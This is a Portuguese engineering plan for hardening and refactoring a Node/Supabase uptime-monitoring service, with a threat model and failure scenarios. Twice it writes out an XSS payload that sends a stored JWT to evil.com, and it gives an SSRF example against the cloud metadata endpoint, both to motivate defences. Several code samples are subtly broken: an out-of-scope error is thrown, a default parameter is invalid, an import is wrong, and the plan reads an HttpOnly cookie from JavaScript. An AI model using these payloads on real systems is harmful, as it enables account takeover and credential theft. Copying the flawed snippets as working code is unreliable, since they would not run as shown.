# Plano Estratégico — Sistema de Monitoramento de Uptime

> **Versão:** 1.0 | **Data:** 2026-09-01
> **Escopo:** Monitoramento de uptime SaaS self-hosted
> **Stack:** Node.js 18 + Express + TypeScript + Supabase (Postgres) + React 18 + Vite + Tailwind

---

## Sumário Executivo

| Domínio | Prioridade | Esforço | Impacto |
|---|---|---|---|
| 🔴 JWT em localStorage (XSS) | CRÍTICA | Alto | Alto |
| 🔴 Fallback de senha em texto plano | CRÍTICA | Baixo | Alto |
| 🟠 Modularizar monolith 1587 linhas | ALTA | Alto | Alto |
| 🟠 N+1 queries + cache zero | ALTA | Médio | Alto |
| 🟠 Sem observabilidade (logs/métricas) | ALTA | Médio | Alto |
| 🟡 Paralelizar checks sequenciais | MÉDIA | Médio | Alto |
| 🟡 Worker threads para PDF | MÉDIA | Médio | Médio |
| 🟡 Code splitting + WebSocket | MÉDIA | Médio | Médio |
| 🟡 Componentização frontend (>700 linhas) | MÉDIA | Médio | Médio |
| 🟢 CI/CD + container hardening | NORMAL | Médio | Médio |

---

## 1. Segurança

### CRÍTICA — Migrar JWT de localStorage para HttpOnly Cookies

**Problema:** Token JWT em `client/contexts/AuthContext.tsx:116` — `localStorage.setItem('auth_token', ...)`. Qualquer XSS rouba o token, dando account takeover por 24h.

**Fluxo de ataque:**
1. Atacante identifica XSS em `/status-page/:slug` (renderiza HTML sem sanitização)
2. `<script>fetch('https://evil.com?jwt='+localStorage.getItem('auth_token'))</script>`
3. Admin acessa a página → token exfiltrado
4. Atacante faz chamadas API como admin por até 24h

**Solução — Backend (`src/index.ts`):**

```typescript
// POST /api/auth/login → setar cookie HttpOnly em vez de retornar só JSON
app.post('/api/auth/login', loginLimiter, async (req, res) => {
  // ... validação ...
  const token = jwt.sign({ id, email, role }, JWT_SECRET, { expiresIn: '15m' })

  res.cookie('auth_token', token, {
    httpOnly: true,      // JavaScript não acessa
    secure: true,        // só HTTPS
    sameSite: 'strict', // CSRF-proof
    maxAge: 15 * 60 * 1000,
    path: '/',
  })

  res.json({ user, token }) // token no body para compat (remover depois)
})

// POST /api/auth/logout → limpar cookie
app.post('/api/auth/logout', (_req, res) => {
  res.clearCookie('auth_token', { path: '/' })
  res.json({ ok: true })
})

// Middleware: ler de cookie, não de header Authorization
function verifyToken(req, res, next) {
  const token = req.cookies?.auth_token
  if (!token) return res.status(401).json({ error: 'Token requerido' })
  try {
    req.user = jwt.verify(token, JWT_SECRET)
    next()
  } catch {
    res.status(401).json({ error: 'Token inválido' })
  }
}
```

**Solução — Frontend:**
- `AuthContext` para de usar localStorage — lê de `document.cookie`
- `apiUtils` remove header `Authorization` (cookie enviado automaticamente pelo browser)
- Interceptor: ao receber 401, tenta `POST /api/auth/refresh` antes de deslogar

**Tempo estimado:** 2 dias

---

### CRÍTICA — Remover fallback de senha em texto plano

**Problema:** `src/index.ts:298` — se a senha no banco não começa com `$2a$`/`$2b$`, compara texto plano diretamente.

```typescript
} else {
  validPassword = password === user.password  // ← texto plano!
  if (validPassword) {
    await bcrypt.hash(password, 10)  // atualiza só na próxima vez
  }
}
```

**Solução:**
1. Migration one-time: hashear todas as senhas que ainda estão em texto plano
2. Remover o branch `else` completamente
3. Se senha não é bcrypt → rejeitar login + logar incidente de segurança

**Tempo estimado:** 2 horas

---

### ALTA — Implementar Refresh Token

**Problema:** Token expira em 24h, sem refresh. Usuário deslogado forçadamente. Atacante com token tem janela de 24h.

**Tabela:**
```sql
CREATE TABLE public.refresh_tokens (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID NOT NULL REFERENCES public.users(id) ON DELETE CASCADE,
  token_hash VARCHAR(64) NOT NULL,
  expires_at TIMESTAMPTZ NOT NULL,
  created_at TIMESTAMPTZ DEFAULT NOW()
);
CREATE INDEX idx_refresh_tokens_user_id ON public.refresh_tokens(user_id);
CREATE INDEX idx_refresh_tokens_hash ON public.refresh_tokens(token_hash);
```

- Access token: 15min (curto, limita janela de ataque)
- Refresh token: UUID aleatório com hash no banco, HttpOnly cookie, 7 dias
- `POST /api/auth/refresh` troca refresh token por novo access token
- Frontend: interceptor detecta 401, tenta refresh antes de deslogar

**Tempo estimado:** 1 dia

---

### MÉDIA — Content Security Policy (CSP)

**Problema:** Helmet configurado mas sem CSP. Scripts injetados têm liberdade total.

**Solução:**
```typescript
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'nonce-{NONCE}'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "https://zhywrrzzezexlvtpqacl.supabase.co"],
      frameAncestors: ["'none'"],
      upgradeInsecureRequests: [],
    }
  }
}))
```

**Tempo estimado:** 4 horas

---

## 2. Arquitetura

### ALTA — Modularizar Monolith (1587 linhas → ~15 arquivos de rota)

**Problema:** `src/index.ts` mistura todas as rotas, middleware e lógica de negócio. Impossível testar, manter e fazer review.

**Estrutura proposta:**

```
src/
  routes/
    auth.routes.ts           # /api/auth/*
    monitors.routes.ts       # /api/monitors/*
    dashboard.routes.ts     # /api/dashboard/*
    reports.routes.ts        # /api/reports/*
    monthly-reports.routes.ts
    pdf.routes.ts
    smtp.routes.ts
    upload.routes.ts
    status-pages.routes.ts
    public.routes.ts        # /api/public/*
  controllers/
    auth.controller.ts
    monitors.controller.ts
    dashboard.controller.ts
    # ...
  middleware/
    auth.middleware.ts       # verifyToken (cookie-based)
    rateLimit.middleware.ts
    errorHandler.middleware.ts
    requestId.middleware.ts
    logger.middleware.ts
  lib/
    cache.ts                 # LRU cache
    retry.ts                 # withRetry
    logger.ts               # logging estruturado
    telemetry.ts            # OpenTelemetry
    database.types.ts       # já existe
    supabase.ts            # já existe
  workers/
    pdf.worker.ts           # Worker thread para PDF
  index.ts                  # ~100 linhas: dotenv, middleware global, routers, listen
```

**Resultado:** `index.ts` de 1587 → ~100 linhas.

**Tempo estimado:** 2 dias

---

### ALTA — Worker Threads para Operações CPU-Intensivas

**Problema:** `PDFService` gera PDF no mesmo thread do Express. PDFKit é síncrono (CPU-bound) — bloqueia o event loop durante geração.

**Solução com Worker Threads:**
```typescript
// src/workers/pdf.worker.ts
import { parentPort } from 'worker_threads'
import PDFDocument from 'pdfkit'

parentPort?.on('message', async ({ id, data }) => {
  const doc = new PDFDocument()
  const chunks: Buffer[] = []
  doc.on('data', chunk => chunks.push(chunk))
  doc.on('end', () => {
    parentPort?.postMessage({ id, success: true, data: Buffer.concat(chunks) })
  })
  generateReportPDF(doc, data)
  doc.end()
})

// src/services/PDFService.ts — pool de workers
import { WorkerPool } from 'workerpool'
const pool = WorkerPool.pool('./dist/workers/pdf.worker.js', { maxWorkers: 2 })

async function generatePDF(data): Promise<Buffer> {
  return await pool.exec('generate', [data])
}
```

**Tempo estimado:** 1 dia

---

### ALTA — Retry com Exponential Backoff

**Problema:** Falhas de API do Supabase (timeout, rate limit, 503) propagam diretamente ao cliente sem retry.

**Solução:**
```typescript
// src/lib/retry.ts
async function withRetry<T>(
  fn: () => Promise<T>,
  opts = { maxAttempts: 3, baseDelay: 500, maxDelay: 5000 }
): Promise<T> {
  for (let attempt = 1; attempt <= opts.maxAttempts; attempt++) {
    try {
      return await fn()
    } catch (err: any) {
      if (err?.status >= 400 && err?.status < 500 && err?.status !== 429) throw err
      if (attempt < opts.maxAttempts) {
        const delay = Math.min(
          opts.baseDelay * 2 ** (attempt - 1) + Math.random() * 100,
          opts.maxDelay
        )
        await new Promise(r => setTimeout(r, delay))
      }
    }
  }
  throw err
}
```

Usar em todas as chamadas `supabase.from(...)`.

**Tempo estimado:** 4 horas

---

## 3. Performance

### ALTA — Resolver N+1 Queries (3 pontos)

**Ponto 1** — `src/index.ts:405-412` — configs de relatório:
```typescript
// ANTES (N+1):
const configs = await Promise.all(monitors.map(m =>
  databaseService.getMonthlyReportConfigByMonitor(m.id)
))

// DEPOIS (1 query):
const configs = await supabase
  .from('monthly_report_configs')
  .select('*')
  .in('monitor_id', monitorIds)
const configMap = new Map(configs.data.map(c => [c.monitor_id, c]))
```

**Ponto 2** — `src/index.ts:473-494` — loop de `collectMonitorStats`:
- Criar RPC `get_monitors_stats(monitor_ids[], start_date, end_date)` que calcula tudo em SQL no banco

**Ponto 3** — `src/monitoring/MonitoringService.ts:181-221` — carregamento de histórico na inicialização:
- **Remover** — não é usado por nenhuma rota pública; histórico é buscado por-demanda

**Tempo estimado:** 4 horas

---

### ALTA — Paralelizar Checks do MonitoringService

**Problema:** `src/monitoring/MonitoringService.ts:272-289` — checks são sequenciais dentro de cada `setInterval`. Um timeout de 30s bloqueia os próximos.

**Solução com concurrency limit:**
```typescript
const BATCH_SIZE = 10

async performScheduledCheck(monitor: Monitor) {
  const results = await Promise.allSettled(
    Array.from(this.monitors.values())
      .filter(m => shouldRunNow(m))
      .slice(0, BATCH_SIZE)
      .map(m => this.performCheck(m))
  )
  results.forEach((r, i) => {
    if (r.status === 'rejected') {
      monitoringLogger('error', 'Check failed', { err: r.reason })
    }
  })
}
```

**Tempo estimado:** 4 horas

---

### MÉDIA — Cache LRU em Memória

**Problema:** Zero cache. Cada requisição ao dashboard faz 3+N queries ao Supabase.

**Solução:**
```typescript
// src/lib/cache.ts
import { LRUCache } from 'lru-cache'

const statsCache = new LRUCache<string, any>({
  max: 200,
  ttl: 30_000,          // 30s para stats
  allowStale: true,    // servir dado antigo enquanto renova
})

export async function getCached<T>(key: string, fetchFn: () => Promise<T>, ttl = 30_000) {
  const cached = statsCache.get(key)
  if (cached && Date.now() - cached.timestamp < ttl) return cached.value
  const fresh = await fetchFn()
  statsCache.set(key, { value: fresh, timestamp: Date.now() })
  return fresh
}
```

| Dado | TTL | Invalidação |
|---|---|---|
| `/api/dashboard/stats` | 30s | write monitors/checks |
| `/api/dashboard/monitors` | 30s | write monitors |
| `/api/public/status/all` | 60s | write checks |
| Monthly report config | 5min | write |
| SMTP config | 1h | never |

**Tempo estimado:** 6 horas

---

### MÉDIA — Índices Compostos no Banco

**Problema:** Queries com `WHERE monitor_id = X ORDER BY checked_at DESC` fazem scans sequenciais na tabela `monitor_checks` (186k+ linhas).

**Solução:**
```sql
CREATE INDEX CONCURRENTLY idx_monitor_checks_monitor_id_checked_at
  ON public.monitor_checks (monitor_id, checked_at DESC)
  WHERE monitor_id IS NOT NULL;

CREATE UNIQUE INDEX CONCURRENTLY idx_monitors_slug
  ON public.monitors (slug)
  WHERE slug IS NOT NULL;

CREATE INDEX CONCURRENTLY idx_monitors_status_active
  ON public.monitors (status, is_active)
  WHERE is_active = true;
```

**Tempo estimado:** 2 horas

---

## 4. Observability

### ALTA — Logging Estruturado em JSON

**Problema:** `console.log` dispersos, sem request ID, sem nível estruturado. Impossível filtrar em produção.

**Solução:**
```typescript
// src/lib/logger.ts
type Level = 'debug' | 'info' | 'warn' | 'error' | 'fatal'

function logger(service: string) {
  return (level: Level, message: string, data: Record<string, unknown> = {}) => {
    const entry = {
      level,
      time: new Date().toISOString(),
      service,
      message,
      ...data
    }
    ;(level === 'error' || level === 'fatal' ? console.error : console.log)(JSON.stringify(entry))
  }
}

export const apiLogger = logger('api')
export const monitoringLogger = logger('monitoring')
```

**Middleware de request ID:**
```typescript
export function requestIdMiddleware(req, res, next) {
  req.requestId = req.headers['x-request-id'] || crypto.randomUUID()
  res.setHeader('X-Request-Id', req.requestId)
  next()
}
```

**Tempo estimado:** 4 horas

---

### ALTA — Healthcheck Profundo

**Problema:** `/api/health` retorna só `{ status: 'ok' }`. Não verifica DB, SMTP, disco.

**Solução:**
```typescript
app.get('/api/health', async (req, res) => {
  const [db, disk] = await Promise.allSettled([
    supabase.from('monitors').select('id').limit(1),
    checkDiskSpace(),
  ])

  const checks = {
    database: db.status === 'fulfilled' ? 'ok' : 'error',
    disk: disk.status === 'fulfilled' ? 'ok' : 'error',
  }
  const healthy = checks.database === 'ok' && checks.disk === 'ok'

  res.status(healthy ? 200 : 503).json({
    status: healthy ? 'ok' : 'degraded',
    timestamp: new Date().toISOString(),
    version: process.env.npm_package_version,
    checks,
    uptime: process.uptime(),
  })
})
```

**Tempo estimado:** 2 horas

---

### ALTA — OpenTelemetry (Tracing + Métricas)

**Problema:** Sem telemetria. Não responde: "Qual endpoint mais lento?", "Quantos checks/min?"

**Stack gratuito:**
```typescript
// src/lib/telemetry.ts
import { NodeSDK } from '@opentelemetry/sdk-node'
import { OTLPTraceExporter } from '@opentelemetry/exporter-trace-otlp-http'

const sdk = new NodeSDK({
  traceExporter: new OTLPTraceExporter({
    url: process.env.OTEL_EXPORTER_OTLP_ENDPOINT || 'http://localhost:4318/v1/traces'
  }),
})
sdk.start()

// Métricas customizadas
meter.createCounter('monitor.checks.total').add(1, { status, monitor_id })
meter.createHistogram('monitor.checks.latency').record(responseTime, { type })
meter.createHistogram('http.request.duration').record(durationMs, { method, route, status_code })
```

**Visualização:** Prometheus + Grafana (containers na VPS).

**Tempo estimado:** 1 dia

---

### MÉDIA — Error Tracking (Sentry)

```typescript
import * as Sentry from '@sentry/node'
Sentry.init({
  dsn: process.env.SENTRY_DSN,
  environment: process.env.NODE_ENV,
  tracesSampleRate: 0.1,
})
```

Alternativa gratuita auto-hospedada: **GlitchTip**.

**Tempo estimado:** 3 horas

---

## 5. Componentização (Frontend)

### MÉDIA — Quebrar ReportsPage (980 linhas) e DomainsPage (746 linhas)

**Estrutura proposta para ReportsPage:**
```
client/pages/ReportsPage/
  index.tsx              # ~80 linhas — estado e roteamento
  components/
    ReportTable.tsx       # Tabela com filtros
    ReportFilters.tsx     # Seletor de período, monitor
    ReportCard.tsx       # Card individual
    ReportChart.tsx       # Gráfico de uptime
  hooks/
    useReports.ts         # Lógica de busca/filtragem
  utils/
    formatReport.ts       # Formatação
```

**Estratégia:** Refatorar incrementalmente — um componente por PR.

**Tempo estimado:** 3 dias (para ambas páginas)

---

### MÉDIA — Hook `useApiQuery` para Eliminar Boilerplate

**Problema:** Cada página reimplementa `useEffect` + `setInterval` + estados de loading/error.

**Solução:**
```typescript
// client/hooks/useApiQuery.ts
export function useApiQuery<T>(
  url: string,
  opts = { refetchInterval?: number; enabled?: boolean }
) {
  const [data, setData] = useState<T | null>(null)
  const [error, setError] = useState<string | null>(null)
  const [loading, setLoading] = useState(true)

  useEffect(() => {
    if (opts.enabled === false) return
    const fetch = async () => {
      const result = await apiGet<T>(url)
      if (result.success) { setData(result.data); setError(null) }
      else setError(result.error || 'Erro desconhecido')
      setLoading(false)
    }
    fetch()
    if (opts.refetchInterval) {
      const id = setInterval(fetch, opts.refetchInterval)
      return () => clearInterval(id)
    }
  }, [url])

  return { data, error, loading, refetch: () => apiGet<T>(url) }
}
```

**Uso:**
```typescript
const { data: stats } = useApiQuery<DashboardStats>('/api/dashboard/stats', {
  refetchInterval: 30_000
})
```

**Tempo estimado:** 4 horas

---

## 6. Infraestrutura

### MÉDIA — Dockerfile Multi-Stage Otimizado

**Problema:** Dockerfile atual não compila TS → JS para produção.

```dockerfile
# Build stage
FROM node:18-alpine AS builder
RUN apk add --no-cache python3 make g++
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
RUN npm run build

# Production stage (só runtime)
FROM node:18-alpine AS production
RUN apk add --no-cache dumb-init
RUN addgroup -S app && adduser -S app -u 10001
WORKDIR /app
COPY --from=builder --chown=app:app /app/dist ./dist
COPY --from=builder --chown=app:app /app/client-dist ./client-dist
COPY --from=builder --chown=app:app /app/node_modules ./node_modules
USER app
HEALTHCHECK --interval=30s --timeout=5s --start-period=40s --retries=3 \
    CMD node healthcheck.js || exit 1
CMD ["dumb-init", "node", "dist/server/index.js"]
```

**Tempo estimado:** 4 horas

---

### MÉDIA — Container Security Hardening

```dockerfile
# Non-root, read-only filesystem (exceto volumes)
USER app

# docker-compose.yml
services:
  app:
    deploy:
      resources:
        limits:
          cpus: '1.0'
          memory: 1G
```

**Tempo estimado:** 2 horas

---

## 7. Threat Model — Matriz de Ataque

| Ameaça | Prob. | Impacto | Risco | Mitigação |
|---|---|---|---|---|
| Account takeover via XSS + JWT (localStorage) | Média | Crítico | 🔴 ALTO | HttpOnly cookies + CSP |
| Supabase outage | Alta | Crítico | 🔴 ALTO | Circuit breaker + cache |
| Credential stuffing (brute force login) | Alta | Alto | 🔴 ALTO | WAF + CAPTCHA + rate limit |
| Fallback de senha em texto plano | Baixa | Crítico | 🟠 MÉDIO | Remover branch else |
| SSRF via monitor HTTP | Baixa | Alto | 🟡 MÉDIO | Bloquear RFC1918 + metadata |
| DoS por excesso de monitores | Média | Médio | 🟡 MÉDIO | Limite por user + queue |
| Memory leak → crash gradual | Média | Alto | 🟠 MÉDIO | Cap array checks + restart |
| Service role key exposta | Baixa | Crítico | 🟠 MÉDIO | Nunca em client bundle |

### Fluxos Críticos

**A1: XSS + Account Takeover**
```
1. XSS em /status-page/:slug (renderiza HTML sem sanitize)
2. <script>fetch('https://evil.com?jwt='+localStorage.getItem('auth_token'))</script>
3. Admin acessa página → JWT exfiltrado
4. Atacante usa token por 24h
```
Mitigação: HttpOnly cookies + CSP nonce + sanitize status page HTML

**A2: SSRF via Monitor**
```
1. Admin cria monitor → http://169.254.169.254/latest/meta-data/
2. Sistema faz GET na mesma rede (se VPS em cloud)
3. Credenciais IAM expostas
```
Mitigação: Bloquear `169.254.0.0/16`, `10.0.0.0/8`, `127.0.0.1` nos checks

**A3: DoS via Supabase Rate Limit**
```
1. Atacante cria 100 monitores com interval=1000ms
2. 100 requests/segundo ao Supabase
3. Rate limit excedido → sistema degradado para TODOS
```
Mitigação: Limite de 20 monitores por user + rate limit por IP + circuit breaker

---

## 8. Pre-Mortem — 5 Cenários de Falha

### C1: Supabase Indisponível (>4h)

| Atributo | Valor |
|---|---|
| **Probabilidade** | 🟠 Alta (plano gratuito) |
| **Impacto** | 🔴 Crítico — sistema completamente inoperante |
| **Causa Raiz** | Rate limit excedido ou outage do provedor |

**Sintomas:** Todas as rotas retornam 500 ou timeout. Dashboard vazio. Monitores param de checar.

**Prevenção:**
- Upgrade para plano pago (SLA garantido)
- Circuit breaker: se Supabase falha 3x, servir do cache por 5min
- Cache local com 30min de TTL: sistema degrada graciosamente
- Alertas: monitoring do monitoring — PagerDuty em API timeout
- Backup semanal do schema + dados

**Recuperação:** Switch para Postgres auto-hospedado ou restaurar backup.

---

### C2: Memory Leak no MonitoringService

| Atributo | Valor |
|---|---|
| **Probabilidade** | 🟡 Média |
| **Impacto** | 🟠 Alto — degradação gradual até OOM kill |

**Causa Raiz:** Array `this.checks` em `MonitoringService` (`src/monitoring/MonitoringService.ts:58`) cresce indefinidamente. Nunca é limitado, nunca é garbage collected.

**Sintomas:** RAM cresce 5-10MB/hora. Após 24-48h, `node` killed by OOM. Container reinicia. Ciclo repete.

**Prevenção:**
- Limitar `this.checks` a 10.000 itens (cap + shift FIFO)
- DELETE FROM monitor_checks WHERE checked_at < NOW() - INTERVAL '90 days' no scheduler
- Container com limite de RAM: `memory: 1G`
- Healthcheck que retorna erro se RAM > 80%

---

### C3: Timeout de PDF Bloqueando Event Loop

| Atributo | Valor |
|---|---|
| **Probabilidade** | 🟢 Baixa |
| **Impacto** | 🟡 Médio — requests travam durante geração |

**Sintomas:** Relatório mensal de 200 páginas. PDFKit fica 10-30s no CPU. Todas as requisições (dashboard, login, status pages) travam.

**Causa Raiz:** `doc.end()` em PDFKit é síncrono e CPU-bound. Node.js é single-threaded.

**Prevenção:**
- Mover geração de PDF para Worker Thread
- Timeout de 60s na rota
- Queue: PDFs grandes vão para fila, processados por workers em background

---

### C4: JWT Expiração Forçada + Lockout

| Atributo | Valor |
|---|---|
| **Probabilidade** | 🟠 Alta (acontece todo dia) |
| **Impacto** | 🟢 Baixo — inconvenience |

**Sintomas:** Usuário trabalha no dashboard. Após 24h, token expira. Próxima ação: 401. Login manual obrigatório.

**Prevenção:**
- Refresh token com HttpOnly cookie
- Frontend: interceptor tenta refresh ao receber 401
- Silent refresh: quando token tem <5min, renova em background

---

### C5: Cascata de Falhas (Supabase + Cache + Database)

| Atributo | Valor |
|---|---|
| **Probabilidade** | 🟡 Média |
| **Impacto** | 🔴 Crítico — falha total do sistema |

**Sintomas:** Supabase fica lento (P99 > 5s). MonitoringService começa a falhar checks. Logs explodem. Container OOM. Tudo cai junto.

**Causa Raiz:** Falha em cascata — um componente lento causa falhas nos outros. Sem circuit breakers, sem degradação graciosa.

**Prevenção:**
- Circuit breaker: após 3 falhas consecutivas, parar de chamar Supabase por 30s
- Cache: servir dados parcialmente frescos quando banco está lento
- Timeout global: todas as chamadas ao Supabase com timeout de 10s
- Graceful degradation: se monitoring falhar, logs de erro mas dashboard continua

---

## 9. Ordem de Execução Recomendada

### Fase 1 — Segurança Crítica (4 dias)
1. Remover fallback de senha em texto plano (2h)
2. Migrar JWT para HttpOnly cookies (2 dias)
3. Implementar refresh token (1 dia)
4. Adicionar CSP (4h)

### Fase 2 — Observabilidade (2 dias)
5. Logging estruturado em JSON (4h)
6. Healthcheck profundo (2h)
7. OpenTelemetry + Prometheus/Grafana (1 dia)

### Fase 3 — Performance (2 dias)
8. Resolver N+1 queries (4h)
9. Cache LRU (6h)
10. Paralelizar checks (4h)
11. Índices compostos (2h)

### Fase 4 — Arquitetura (4 dias)
12. Modularizar monolith (2 dias)
13. Worker threads para PDF (1 dia)
14. Retry com backoff (4h)

### Fase 5 — Frontend (5 dias)
15. Hook useApiQuery (4h)
16. Quebrar ReportsPage/DomainsPage (3 dias)
17. Code splitting com lazy loading (3h)
18. WebSocket para updates realtime (1 dia)

### Fase 6 — Infraestrutura (2 dias)
19. Dockerfile multi-stage otimizado (4h)
20. Container hardening (2h)
21. Terraform (1 dia)
22. Error tracking (Sentry) (3h)

### Total: ~19 dias

---

## 10. Critérios de Pronto por Domínio

| Domínio | Critério |
|---|---|
| **Segurança** | Pentest manual cobriu todos os fluxos da matriz. Zero Findings High/Critical. |
| **Performance** | P95 latency < 200ms para /api/dashboard/monitors. Checks executam em <interval/2. |
| **Observability** | Qualquer engineer consegue responder "o que aconteceu?" olhando logs via request ID. |
| **Arquitetura** | `src/index.ts` < 150 linhas. Qualquer rota pode ser alterada/testada independentemente. |
| **Frontend** | Nenhuma página > 300 linhas. Hooks com testes. |
| **Infraestrutura** | Deploy completo via `terraform apply`. Zero configuração manual em server novo. |
